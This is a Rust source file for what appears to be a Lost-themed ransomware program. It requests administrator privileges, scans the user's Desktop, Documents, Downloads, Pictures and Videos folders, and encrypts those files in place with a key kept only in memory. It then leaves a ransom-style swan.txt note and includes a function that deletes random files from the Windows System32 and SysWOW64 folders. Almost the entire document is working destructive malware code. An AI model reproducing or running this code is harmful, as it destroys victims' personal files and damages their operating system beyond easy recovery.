extern crate winapi;
extern crate winres;

use std::fs;
use std::io::{Read, Write, Seek, SeekFrom};
use std::fs::{File, OpenOptions};
use std::env;
use std::path::PathBuf;
use std::path::Path;
use walkdir::WalkDir;
use rand::{Rng, SeedableRng, thread_rng};
use rand::prelude::SliceRandom;
use rand::rngs::StdRng;
use sodiumoxide::crypto::secretbox::{self, Key, Nonce};
use lazy_static::lazy_static;

const CHUNK_SIZE: usize = 4096;
static mut USER_FILES: Vec<String> = Vec::new();

lazy_static! {
    static ref KEY: Key = generate_key(); 
    static ref NONCE: Nonce = generate_nonce();
}

/// Generate a random key for encryption to be stored as lazy_static
fn generate_key() -> Key {
    let mut rng = StdRng::from_entropy();
    let mut key = [0u8; secretbox::KEYBYTES];
    rng.fill(&mut key);
    Key::from_slice(&key).unwrap()
}

/// Generate a random nonce for encryption to be stored as lazy_static
fn generate_nonce() -> Nonce {
    let mut rng = StdRng::from_entropy();
    let mut nonce = [0u8; secretbox::NONCEBYTES];
    rng.fill(&mut nonce);
    Nonce::from_slice(&nonce).unwrap()
}

// Runs to escalate admin privleges
fn run_as_admin() {
    let mut res = winres::WindowsResource::new();
    res.set_manifest(r#"
    <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
        <security>
            <requestedPrivileges>
                <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
            </requestedPrivileges>
        </security>
    </trustInfo>
    </assembly>
    "#);
}

// Recursively scans a directory and its subdirectories and returns a string vector
fn scan_directory(dir: impl AsRef<Path>, vec: Vec<String>, size_limit: u64) -> Vec<String> {
    let dir = dir.as_ref();
    let mut vec2: Vec<String> = vec;

    for entry in WalkDir::new(dir).into_iter().filter_map(Result::ok) {
        let path = entry.path();

        // Get the metadata of the file
        if let Ok(metadata) = fs::metadata(path) {
            // Check if it's a file and its size
            if metadata.is_file() && metadata.len() <= size_limit {
                vec2.push(path.display().to_string());
                println!("{}", path.display().to_string());
            }
        }
    }

    vec2
}

// Function retrieves user directory, current directory, and removes current files from user_files vector before returning user_files prior to encryption
fn get_user_files() -> Vec<String> {
    let mut user_files: Vec<String> = Vec::new();
    let mut user_directories: Vec<String> = Vec::new();

    // Retrieves user directory
    fn get_user_directory() -> Option<PathBuf> {
        match env::var_os("USERPROFILE") {
            Some(user_dir) => Some(PathBuf::from(user_dir)),
            None => None,
        }
    }

    // Refines user_files by removing current program files before returning
    if let Some(user_dir) = get_user_directory() {
        // Collecting important directories path strings of user
        let mut desktop_dir = user_dir.clone();
        desktop_dir.push("Desktop");
        user_directories.push(desktop_dir.to_str().unwrap().to_string());

        let mut downloads_dir = user_dir.clone();
        downloads_dir.push("Downloads");
        user_directories.push(downloads_dir.to_str().unwrap().to_string());

        let mut document_dir = user_dir.clone();
        document_dir.push("Documents");
        user_directories.push(document_dir.to_str().unwrap().to_string());

        let mut videos_dir = user_dir.clone();
        videos_dir.push("Videos");
        user_directories.push(videos_dir.to_str().unwrap().to_string());

        let mut pictures_dir = user_dir.clone();
        pictures_dir.push("Pictures");
        user_directories.push(pictures_dir.to_str().unwrap().to_string());

        for i in 0..user_directories.len() {
            if user_directories.get(i).unwrap().contains("TH3SW4N") || user_directories.get(i).unwrap().contains("th3sw4n") {
                eprintln!("Error locating user files in controller.rs...");
            } else {
                user_files = scan_directory(user_directories.get(i).unwrap(), user_files.clone(), 1024);
            }
        }
    }

    return user_files;
}

// Iterates through every file provided and encrypts using lazy_static KEY and NONCE
fn encrypt_user_files()  {
    // Iterates through every user file path to encrypt
    unsafe {
        for i in 0..USER_FILES.len() {
            let _ = encrypt(USER_FILES.get(i).unwrap());
        }
    }
    
    // Encryption method for singular file utilizing lazy_static KEY and NONCE
    fn encrypt(file_path: &str) -> Result<(), std::io::Error> {
        let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(file_path)?;

        let mut buffer = [0u8; CHUNK_SIZE];
        let mut total_bytes_encrypted = 0;

        file.seek(SeekFrom::Start(0))?;

        loop {
            let bytes_read = file.read(&mut buffer)?;
            if bytes_read == 0 {
                break;
            }

            let ciphertext = secretbox::seal(&buffer[..bytes_read], &NONCE, &KEY);

            file.seek(SeekFrom::Start(total_bytes_encrypted as u64))?;
            file.write_all(&ciphertext)?;

            total_bytes_encrypted += bytes_read;
        }

        Ok(())
    }
}

// Shuffles and selects first 5 files provided and decrypts using lazy_static KEY and NONCE
pub fn decrypt_user_files() {
    let mut file_num = 5;
    unsafe {
        USER_FILES.shuffle(&mut thread_rng());
    }
    
    // Ensures that decrypt does not function if there are no files left to decrypt
    unsafe{
        if file_num > USER_FILES.len() {
            file_num = USER_FILES.len();
        }
    }

    // Iterates through user_files up to the file_num and decrypts files before removing file_path from vector
    unsafe {
        for i in 0..file_num {
            let _ = decrypt(USER_FILES.get(i).unwrap().to_string());
            USER_FILES.remove(i);
        }
    }
    
    // Decryption method for singular file utilizing lazy_static KEY and NONCE
    fn decrypt(file_path: String) -> Result<(), std::io::Error> {
        let mut file = OpenOptions::new()
        .read(true)
        .write(true)
        .open(file_path)?;

    let mut buffer = [0u8; CHUNK_SIZE];
    let mut total_bytes_decrypted = 0;
    let mut decrypted_data = Vec::new();

    file.seek(SeekFrom::Start(0))?;

    loop {
        let bytes_read = file.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        let plaintext = match secretbox::open(&buffer[..bytes_read], &NONCE, &KEY) {
            Ok(data) => data,
            Err(_) => {
                // On decryption failure, use the original buffer content
                buffer[..bytes_read].to_vec()
            }
        };

        decrypted_data.extend_from_slice(&plaintext);
        total_bytes_decrypted += bytes_read;
    }

    // Truncate the file to zero bytes before writing the decrypted data
    file.set_len(0)?;

    // Write the decrypted data back to the file
    file.seek(SeekFrom::Start(0))?;
    file.write_all(&decrypted_data)?;

    Ok(())
    }
}

// Collects and returns all important system files as string vector, using System32 and SysWOW64 for the Windows OS
fn collect_sys_files() -> Vec<String>  {
    let directories = vec!["C:\\Windows\\System32", "C:\\Windows\\SysWOW64"];
    let mut system_files: Vec<String> = Vec::new();

    for dir in directories {
        system_files = scan_directory(dir, system_files.clone(), 0);
    }

    let sys_files = system_files;
    return sys_files;
}

// Removes between 1 to 20 system files provided by collect_sys_files() function
pub fn remove_sys_files() {
    // Collects available system files
    let mut system_files: Vec<String> = collect_sys_files();
    system_files.shuffle(&mut thread_rng());

    // Picks number between 1 to 20 for deletion process
    let mut rand = rand::thread_rng();
    let mut rand_num = rand.gen_range(1..20);

    // Ensures that remove does not function if there are no files left to remove
    if system_files.len() == 0 {
        println!("All system files already removed...")
    } else {
        // Ensures that length of system files will not be below rand_num generated
        if rand_num > system_files.len() {
            rand_num = system_files.len();
        }

        for i in 0..rand_num {
            if let Some(system_file) = system_files.get(i) {
                let _ = fs::remove_file(system_file);
            }
        }
    }
}

// Creates file name swan.txt and adds to Desktop
fn create_desktop_document() {
    fn get_user_directory() -> Option<PathBuf> {
        match env::var_os("USERPROFILE") {
            Some(user_dir) => Some(PathBuf::from(user_dir)),
            None => None,
        }
    }

    // Retrieves user desktop path
    if let Some(mut user_dir) = get_user_directory() {
        user_dir.push("Desktop");
        user_dir.push("swan.txt");

        if let Ok(mut file) = File::create(&user_dir) {
            // Writes swan.txt data
            if let Err(err) = writeln!(file, "THE CODE IS LOST: 4 8 15 16 23 42\nUTILIZE THE CODE TO FIX FILES") {
                eprintln!("Failed to write to file: {}", err);
            } else {
                println!("File created successfully: {:?}", user_dir);
            }
        } else {
            eprintln!("Failed to create file: {:?}", user_dir);
        }
    }
}

// Executes main function which gather admin permissions before getting user files, encrypting, and creating document with code to TH3SW4N
pub fn main() {
    run_as_admin();
    unsafe {
        USER_FILES = get_user_files();
    }
    encrypt_user_files();
    create_desktop_document();
}